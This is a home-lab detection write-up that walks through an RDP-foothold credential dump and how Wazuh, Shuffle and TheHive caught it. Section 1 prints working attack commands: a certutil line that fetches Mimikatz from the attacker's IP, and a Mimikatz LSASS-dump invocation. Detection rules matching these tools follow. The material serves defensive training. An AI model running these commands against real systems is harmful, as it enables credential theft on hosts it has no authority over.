# Scenario 05 — [Critical] Credential Dumping (Mimikatz / LSASS)

The post-compromise chain: it continues directly from Scenario 04, running **inside
the Type-10 RDP session** established there — taking the hands-on foothold and
showing what an attacker does *next*: pull a tool onto the host and steal
credentials out of memory. This is the scenario that exercises the Credential
Access tactic end-to-end and contrasts **behavior-based** with **name-based**
detection — with both firing live on the same run.

| | |
|---|---|
| **MITRE ATT&CK** | T1105 (Ingress Tool Transfer) → T1003.001 (OS Credential Dumping: LSASS Memory) / T1003 (OS Credential Dumping) — chained from the T1078.003 foothold in Scenario 04 |
| **Attacker** | Kali — 192.168.56.10, acting hands-on in the RDP session as `Client` |
| **Target** | Windows 10 — DESKTOP-T0LOHB5 (192.168.56.30) |
| **Target account** | `Client` — the local admin compromised in Scenario 04 (High-integrity token) |
| **Detection source** | Wazuh agent → Sysmon (EID 1 process creation; EID 10 process access to LSASS) |
| **Rules fired** | 92075 (built-in, level 12 — certutil ingress transfer, T1105) · 92900 (built-in, level 12 — LSASS access, T1003.001) · 100002 (custom, level 15 — Mimikatz by original filename, T1003) |
| **Reaches** | Detection → SOAR → TheHive alert (92900 forwarded; 92075 + 100002 are supporting evidence) |
| **Status** | ✅ Validated — all three rules fired live in one pass, `2026-10-29 02:34 UTC` |

---

## 1. Attack

This scenario runs **inside the foothold from Scenario 04**: the `Client` account
was compromised via RDP brute force, and the Type-10 interactive session
(`92653`, `02:34:00 UTC`) is a real desktop on `192.168.56.30`. The two actions
below are performed hands-on in that session — which is exactly why an interactive
session, not just a credential check, mattered in Scenario 04.

**Step 1 — Pull the tool onto the host (T1105).** Mimikatz is served from Kali
(the same simple HTTP-server pattern used to detonate the phishing IOC in
Scenario 02) and fetched with `certutil`, a signed, built-in Windows binary
(a "LOLBin") — a common way to download tooling without introducing a new
executable downloader:

```bash
# Kali: serve the tool
python3 -m http.server 80
```
```powershell
# Windows (in the RDP session) — note the deliberate rename to m.exe
certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
```

The rename to `m.exe` is intentional — it demonstrates that the detections below do
**not** rely on the file's name on disk.

**Step 2 — Dump credentials from memory (T1003.001).** Mimikatz is run against
LSASS to read credential material for accounts logged on to the host:

```powershell
C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

`privilege::debug` acquires the debug privilege needed to read another process's
memory; `sekurlsa::logonpasswords` is the module that reads LSASS. This runs in the
**elevated (High-integrity) token of the local admin `Client`** — not SYSTEM — which
is all that is required to open LSASS for read. Sysmon records the LSASS access
with `targetUser NT AUTHORITY\SYSTEM` because that is the account **LSASS itself**
runs as, not the account doing the reading (`sourceUser … \Client`).

> _Evidence: `evidence/scenario-05-creddump/attack-output.txt` — the certutil
> transfer and the Mimikatz command. **The dumped credential material is
> deliberately redacted**: it is stolen secrets, and the detections below are the
> proof the dump occurred, not the loot._

---

## 2. Detection

Three detections cover this activity and all three fired live in the same pass. Two
are built-in (certutil transfer, LSASS access); one is the custom name-based rule.
The behavioral-vs-name-based contrast between 92900 and 100002 is the analytic
point of the scenario — and because the custom rule was fixed to fire (§2b), you
can see **both** approaches catch the same Mimikatz run.

### 2a. Behavioral detection — rule 92900 (LSASS access)

Wazuh's built-in **rule 92900**, driven by **Sysmon Event ID 10 (process access)**.
When Mimikatz opens a handle to LSASS to read its memory, Sysmon records the
cross-process access and 92900 matches it:

```
rule.id            92900   (level 12)
rule.description   "Lsass process was accessed by C:\Users\Public\m.exe
                    with read permissions, possible credential dump"
rule.groups        sysmon, sysmon_eid10_detections, windows
rule.mitre.id      T1003.001   (Credential Access / LSASS Memory)
eventID            10          (Sysmon process access)
sourceImage        C:\Users\Public\m.exe            ← the renamed Mimikatz binary
sourceUser         DESKTOP-T0LOHB5\Client           ← the reader (the compromised admin)
targetImage        C:\Windows\system32\lsass.exe
targetUser         NT AUTHORITY\SYSTEM              ← the account LSASS runs as
grantedAccess      0x1010                           ← read access to process memory
```

This is **behavior-based**: it keys on *the act of reading LSASS memory*, not on any
filename, so the rename to `m.exe` is irrelevant — the access itself is the signal.

![Wazuh Discover rule.id:92900 scoped to the run — one LSASS-access hit, m.exe accessing lsass.exe, grantedAccess 0x1010, sourceUser Client, targetUser SYSTEM](../../evidence/scenario-05-creddump/wazuh-92900-alerts.png)
*The LSASS-access alert for this run (event `1793241281.2094013`, `02:34:41 UTC`):
`m.exe` accessing `lsass.exe`, `grantedAccess 0x1010`, `sourceUser
DESKTOP-T0LOHB5\Client`.*

![Expanded 92900 event — id 1793241281.2094013, eventID 10, grantedAccess 0x1010, MITRE T1003.001, sourceImage m.exe, targetImage lsass.exe](../../evidence/scenario-05-creddump/wazuh-92900-detail.png)
*Event `1793241281.2094013` expanded: rule 92900 level 12, MITRE T1003.001,
`sourceImage …\m.exe → targetImage …\lsass.exe`, `rule.groups` includes
`sysmon_eid10_detections` — the group that classifies it as a Sysmon Event-ID-10
detection (§3 explains why forwarding keys on the specific rule ID, not this group).*

> _Evidence: `alert-92900-lsass.json`, `wazuh-92900-alerts.png`,
> `wazuh-92900-detail.png`. Authoritative time is the UTC `systemTime
> 02:34:40.228Z`; on cross-host clocks see the
> [README](../../README.md#honesty--scope-notes) convention._

### 2b. Name-based custom rule — rule 100002 (fixed, now fires live)

Alongside the built-in, a **custom rule 100002** catches Mimikatz by the identity
baked into its binary, using **Sysmon Event ID 1 (process creation)**. Sysmon logs
the **OriginalFileName** field — read from the PE's embedded version metadata,
**not** the file's name on disk. Mimikatz's compiled binary carries `mimikatz.exe`
there, so a rename doesn't change it. Wazuh decodes it as
`win.eventdata.originalFileName`:

```xml
<group name="sysmon,sysmon_eid1_detections,">
  <rule id="100002" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\.exe</field>
    <description>Mimikatz Usage Detected (original filename match)</description>
    <mitre>
      <id>T1003</id>
    </mitre>
  </rule>
</group>
```

Plain-English:
- `<if_group>sysmon_event1</if_group>` — anchor the rule to the Sysmon
  process-creation tree (see below).
- `originalFileName (?i)mimikatz\.exe` — case-insensitive regex match on the PE's
  original filename metadata.
- `level 15` — one below Wazuh's maximum (the scale tops out at **16**).

**Kept deliberately name-based.** 100002 matches *only* the PE `OriginalFileName` —
nothing about the command line or runtime behavior. That is by design: it is the
cheap, specific *"this is Mimikatz"* signal, and it is paired with the behavioral
92900 (*"something read LSASS"*) in §2a, not merged with it. Folding a `sekurlsa::`
command-line match into 100002 would blur that contrast — matching on what the tool
*does* is 92900's job, and a recompiled or metadata-stripped Mimikatz that slips past
100002's name check is exactly the case 92900 is there to catch. The two rules are
most useful as a clean pair (name **and** behavior), not as one hybrid rule.

**The fix that made it fire — `if_group`, not field-matching.** The rule originally
had **no parent dependency** (no `<if_group>`/`<if_sid>`). A parentless custom rule
falls into Wazuh's default **syslog** evaluation phase, so it was never tested
against the `windows_eventchannel`-decoded Sysmon events — and never fired, even
though the fields decoded correctly and `wazuh-logtest` passed. Built-in rule
**61603** decodes Sysmon Event ID 1 and assigns it the group **`sysmon_event1`**;
anchoring 100002 with `<if_group>sysmon_event1</if_group>` makes it a child of that
tree, so it is evaluated on every Sysmon process-creation event. With that one
line, 100002 **fired live** on this run (event `1793241281.2087863`, level 15,
T1003) — the process-creation of `m.exe`, ~40 ms before 92900 saw it touch LSASS.

> _This corrects an earlier write-up that blamed a missing `sysmon_event1` group;
> the group **is** produced (by 61603) — the real cause was the parentless rule
> defaulting to the syslog phase. Logged as a challenge item in
> [challenges-and-resolutions.md](../challenges-and-resolutions.md)._
>
> _Evidence: `alert-100002-mimikatz.json` — `originalFileName: mimikatz.exe`,
> `user: DESKTOP-T0LOHB5\Client`, `integrityLevel: High`, `commandLine` with
> `sekurlsa::logonpasswords`._

### 2c. Ingress-tool-transfer detection — rule 92075 (certutil)

The `certutil` download is caught by Wazuh's built-in **rule 92075** (level 12,
**T1105**), which matches `certutil.exe` with a `-urlcache … -f` download of an
executable payload — driven by **Sysmon Event ID 1**. This is the T1105 half of the
chain **detected**, not merely observed in telemetry:

```
rule.id            92075   (level 12)
rule.mitre.id      T1105   (Command and Control / Ingress Tool Transfer)
image              C:\Windows\System32\certutil.exe
eventID            1       (Sysmon process creation)
```

So the full chain is alerted at every stage: **92075** (tool pulled in) → **92900 /
100002** (tool runs and dumps LSASS).

> _Evidence: `alert-92075-certutil.json` (event `1793241263.2077496`,
> `02:34:23 UTC`) — the certutil process-creation with the
> `http://192.168.56.10/...` command line._

---

## 3. SOAR → alert creation

The manager's Shuffle integration forwards rule **92900** by its specific rule ID
(the rule-ID block in
[`config/ossec-integration.xml`](../../config/ossec-integration.xml)) — **not** via
the `sysmon_eid10_detections` group it belongs to, because that group also carries
benign Event-ID-10 rules (e.g. 92910) that would reach the SOAR as noise. `92900`
is the **headline** credential-dump alert; `92075` and `100002` are supporting
evidence that stay out of the SOAR queue (one headline alert per incident). The
forwarded alert becomes a Shuffle run and a TheHive alert — the same path phishing
(02), SSH (03) and RDP (04) take:

![Shuffle run for the cred-dump — $exec FINISHED, rule_id 92900, id 1793241281.2094013, the LSASS-access title](../../evidence/scenario-05-creddump/shuffle-creddump.png)
*Shuffle run: `FINISHED`, `rule_id 92900`, `id 1793241281.2094013`.*

![TheHive alert for the cred-dump — SEVERITY CRITICAL, tags 92900/wazuh, Reference 1793241281.2094013, description naming rule 92900 and the LSASS access](../../evidence/scenario-05-creddump/thehive-creddump.png)
*TheHive alert: `SEVERITY:CRITICAL`, tagged `92900` / wazuh, description `Rule 92900
| Agent: Project-Windows | Lsass process was accessed by C:\Users\Public\m.exe …`.
`Reference 1793241281.2094013` ties the alert to the exact Wazuh event.*

No VirusTotal enrichment applies — this is a host/behavior detection with no
external IP to resolve. (Contrast Scenario 02, where the IOC is a real external IP
and VT enrichment is the point.)

> _Evidence: `shuffle-creddump.png`, `thehive-creddump.png`._

---

## 4. Triage

- **Detection & severity** — the behavioral rule **92900 (level 12)** fired on
  `m.exe` opening `lsass.exe` with `grantedAccess 0x1010` (read). Reading LSASS
  memory from a user-writable path (`C:\Users\Public\`) has essentially **no benign
  explanation** on an endpoint. *Note the two scales: 92900 is level 12 on Wazuh's
  detection scale (which tops out at 16), but the incident severity is **Critical**
  — severity is impact-based (a confirmed credential dump on a compromised admin
  host), not the detecting rule's number.*
- **Caught three ways** — the ingress transfer (92075, T1105), the behavioral LSASS
  read (92900), and the name-based PE identity (100002) all fired on the one run.
  The on-disk name was `m.exe`, yet 92900 caught the *behavior* and 100002 caught
  the embedded `mimikatz.exe` identity — a benign-looking filename hiding a
  known-bad binary accessing LSASS is a strong malicious signal from every angle.
- **Correlation across scenarios** — this fired on the same host
  (`192.168.56.30`) and user (`Client`) compromised in Scenario 04, **inside the
  same Type-10 session**. Failed RDP logons → lockout → interactive session →
  certutil pull → **credential dump** is a coherent attacker progression, not an
  isolated event. Tying 92900 back to the Scenario 04 alerts is the analytic core.

**Verdict:** True positive, **Critical**. Confirmed credential-dumping attempt on
an already-compromised host.

---

## 5. Response

Because LSASS was accessed, assume every credential cached in memory on that host
is now stolen (the signed-in user's hash/password, any service credentials, cached
domain credentials). This is a post-exploitation, high-impact event — the
**human-in-the-loop** tier of the response model, but acted on fast:

- **Isolate the host** (`192.168.56.30`) to stop further hands-on activity.
- **Force-reset credentials** for every account that had a session on the box —
  their secrets must be treated as compromised, not just the attacker's entry
  account.
- **Hunt for lateral movement** — dumped credentials are used to move to other
  hosts; check for logons elsewhere using those accounts.

There is no "block the source IP" action here as there is for brute force — the
attacker is already inside, so the response is containment and credential rotation,
not perimeter blocking.

---

## 6. The chain (how it threads the scenarios together)

```
RDP brute force (Scenario 04, T1110 → T1078.003)  →  Client compromised, Type-10 session
   →  certutil pulls Mimikatz onto the host        (T1105, detected by 92075)
   →  Mimikatz dumps credentials from LSASS memory  (T1003.001, detected by 92900 + 100002)
```

Every stage is alerted: the tool transfer (92075), the LSASS read (92900), and the
tool's own identity (100002). Download the tool, run the tool — the chain reads as
one fluid action an attacker would actually take, performed inside the Scenario 04
session.

**Persistence was deliberately not modeled.** This scenario represents a fast
credential-harvesting ("smash-and-grab") operation; establishing persistence is a
common *next* move but was intentionally left out to keep the chain tight. It is
noted as a possible extension rather than a gap.

---

## 7. Lessons Learned

- **Behavior-based and name-based both fired — and the difference still matters.**
  The name-based rule (100002, OriginalFileName) defeats a simple rename but an
  attacker who recompiles or strips the PE metadata slips past it. The behavioral
  rule (92900, Sysmon EID 10 — process access to `lsass.exe`) keys on the *act* of
  reading LSASS memory, so it survives both rename and metadata-strip. Here both
  caught the run, which is the ideal: name-based catches it cheaply and specifically
  ("this is Mimikatz"), behavior-based catches it robustly ("something read LSASS").
  92900 is the primary/forwarded detection; 100002 is the complementary one.
- **A parentless custom rule silently never fires.** 100002 passed `wazuh-logtest`
  yet produced nothing live until it was anchored with `<if_group>sysmon_event1</if_group>`.
  `logtest` evaluates a rule in isolation; the live pipeline only tests it where its
  decoding phase places it. Anchor custom Sysmon rules to the Sysmon tree (61603 →
  `sysmon_event1`) or they fall into the syslog phase and are never reached.
- **Why LSASS?** The Local Security Authority Subsystem Service holds credential
  material for signed-in users in memory — password hashes, Kerberos tickets, and in
  some configurations plaintext. "Dumping LSASS" means reading that process's memory
  to steal those credentials, which is exactly what `sekurlsa::logonpasswords` does.
  This is the concept that makes rule 92900, "pass-the-hash," and credential theft
  one connected story.
- **Severity is impact-based, not the detector's number.** The behavioral rule is
  level 12 on a scale that tops out at 16, yet the incident is **Critical**: a
  confirmed LSASS credential dump means every credential cached on the host must be
  treated as stolen. Severity tracks consequence (impact + confidence).
- **`logtest` success ≠ live detection** (the recurring lab meta-lesson): confirm
  the rule fires on a real Sysmon event with the agent Active, then capture the
  evidence. 100002 is the case study — logtest-green for ages, live-silent until the
  `if_group` fix.

---

## 8. Validation & evidence capture

Validated live in one pass — all three rules fired on the same host under the same
`Client` session, and every artifact in `evidence/scenario-05-creddump/` carries
its event ID:

| Rule | Event ID | UTC | What fired |
|---|---|---|---|
| 92075 | `1793241263.2077496` | `02:34:23` | certutil ingress transfer (T1105) |
| 100002 | `1793241281.2087863` | `02:34:41` | Mimikatz PE OriginalFileName (T1003) |
| 92900 | `1793241281.2094013` | `02:34:41` | LSASS read, forwarded → TheHive (T1003.001) |

To reproduce and capture on the manager:

```bash
mkdir -p evidence/scenario-05-creddump
```
```bash
# behavioral LSASS-access alert (92900) — copy its id, then pull the full record
sudo jq -c 'select(.rule.id=="92900")' /var/ossec/logs/alerts/alerts.json | tail -1
```
```bash
sudo jq 'select(.id=="<THAT_ID>")' /var/ossec/logs/alerts/alerts.json \
  > evidence/scenario-05-creddump/alert-92900-lsass.json
```
```bash
# name-based (100002) and ingress-transfer (92075) supporting evidence
sudo jq -c 'select(.rule.id=="100002")' /var/ossec/logs/alerts/alerts.json | tail -1
sudo jq -c 'select(.rule.id=="92075")'  /var/ossec/logs/alerts/alerts.json | tail -1
```

**Screenshots (captured):** the 92900 alert list, the alert detail (`sourceImage
m.exe → targetImage lsass.exe`, `grantedAccess 0x1010`, T1003.001), the Shuffle run,
and the TheHive alert — in `evidence/scenario-05-creddump/`.

> `docs/mitre-coverage.md` lists T1003.001, T1003 and T1105 as validated, citing
> this scenario.
